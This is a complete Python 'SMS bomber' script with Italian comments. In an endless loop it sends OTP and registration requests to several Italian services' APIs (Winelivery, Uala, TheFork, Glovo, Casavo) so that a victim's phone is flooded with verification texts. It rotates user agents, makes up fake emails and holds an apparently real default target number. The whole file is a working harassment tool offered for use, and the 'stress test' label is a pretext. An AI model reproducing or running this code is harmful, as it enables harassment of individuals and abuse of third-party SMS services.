#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import sys
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Fore.RED}███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
{Fore.RED}██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
{Fore.WHITE}███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
{Fore.WHITE}╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
{Fore.RED}███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
{Fore.RED}╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
{Fore.YELLOW}             [ VERSIONE GOD-MODE - TEST DI STRESS REALE ]
"""

class SMSBomber:
    def __init__(self, target):
        self.target = target # Formato: 393738513104
        self.clean_target = target[2:] if target.startswith("39") else target # 3738513104
        self.success = 0
        self.failed = 0
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36"
        ]

    def get_headers(self, referer=None, origin=None):
        h = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
            "X-Requested-With": "XMLHttpRequest"
        }
        if referer: h["Referer"] = referer
        if origin: h["Origin"] = origin
        return h

    async def call_api(self, session, name, method, url, json_data=None, form_data=None, headers=None):
        try:
            async with session.request(method, url, json=json_data, data=form_data, headers=headers, timeout=8) as resp:
                # 200, 201, 204 sono successi. 400/422 spesso indicano che l'SMS è partito ma l'utente esiste già
                if resp.status in [200, 201, 204, 400, 422]:
                    self.success += 1
                    # print(f"{Fore.GREEN}[DEBUG] {name}: {resp.status}") 
                else:
                    self.failed += 1
                    # print(f"{Fore.RED}[DEBUG] {name}: {resp.status}")
        except Exception as e:
            self.failed += 1
            # print(f"{Fore.RED}[DEBUG] {name} ERROR: {str(e)}")

    async def provider_winelivery(self, session):
        url = "https://www.winelivery.com/it/api/v1/customer/login"
        payload = {"phone": self.target}
        await self.call_api(session, "Winelivery", "POST", url, json_data=payload, headers=self.get_headers("https://www.winelivery.com/"))

    async def provider_uala(self, session):
        url = "https://www.uala.it/api/v2/auth/otp"
        payload = {"phone": "+" + self.target}
        await self.call_api(session, "Uala", "POST", url, json_data=payload, headers=self.get_headers("https://www.uala.it/"))

    async def provider_thefork(self, session):
        url = "https://www.thefork.it/api/user/v1/auth/otp"
        payload = {"phone_number": "+" + self.target}
        await self.call_api(session, "TheFork", "POST", url, json_data=payload, headers=self.get_headers("https://www.thefork.it/"))

    async def provider_glovo(self, session):
        url = "https://glovoapp.com/api/v2/oauth/register"
        payload = {"phone": "+" + self.target, "name": "Andrea", "email": f"user{random.randint(1,99999)}@gmail.com"}
        await self.call_api(session, "Glovo", "POST", url, json_data=payload, headers=self.get_headers("https://glovoapp.com/"))

    async def provider_casavo(self, session):
        url = "https://api.casavo.com/auth/v1/otp"
        payload = {"phone_number": "+" + self.target}
        await self.call_api(session, "Casavo", "POST", url, json_data=payload, headers=self.get_headers("https://www.casavo.it/"))

    async def attack(self):
        print(f"{Fore.CYAN}[*] Avvio attacco su: {Fore.YELLOW}{self.target}")
        print(f"{Fore.WHITE}[!] Premi Ctrl+C per fermare.")
        
        async with aiohttp.ClientSession() as session:
            while True:
                tasks = [
                    self.provider_winelivery(session),
                    self.provider_uala(session),
                    self.provider_thefork(session),
                    self.provider_glovo(session),
                    self.provider_casavo(session)
                ]
                await asyncio.gather(*tasks)
                print(f"{Fore.GREEN}[+] Successi (SMS Partiti): {self.success} | {Fore.RED}[-] Falliti/Bloccati: {self.failed}", end="\r")
                await asyncio.sleep(random.uniform(2, 4))

async def main():
    print(BANNER)
    
    # Chiedi il numero all'inizio se non passato da riga di comando
    if len(sys.argv) >= 2:
        target = sys.argv[1].replace("+", "")
    else:
        print(f"{Fore.CYAN}Inserisci il numero di telefono (es: 393738513104)")
        target = input(f"{Fore.WHITE}BERSAGLIO > ").strip().replace("+", "")
        if not target:
            target = "393738513104" # Default se premi solo invio
            print(f"{Fore.YELLOW}[!] Usando numero di default: {target}")

    bomber = SMSBomber(target)
    try:
        await bomber.attack()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Attacco terminato. Totale stimato inviati: {bomber.success}")

if __name__ == "__main__":
    asyncio.run(main())
